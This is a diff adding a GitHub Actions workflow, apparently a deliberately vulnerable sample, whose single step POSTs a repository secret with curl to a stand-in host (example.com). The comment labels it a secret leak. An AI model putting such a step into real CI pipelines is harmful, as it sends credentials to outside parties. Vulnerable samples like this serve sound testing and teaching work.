@@ -1,0 +1,12 @@
+name: Vulnerable Workflow
+on:
+  pull_request:
+    types: [opened]
+jobs:
+  vulnerable_job:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Vulnerable Step
+        run: |
+          # This step is vulnerable because it leaks a secret to a third-party service.
+          curl -X POST -d "secret=${{ secrets.MY_SECRET }}" https://example.com/
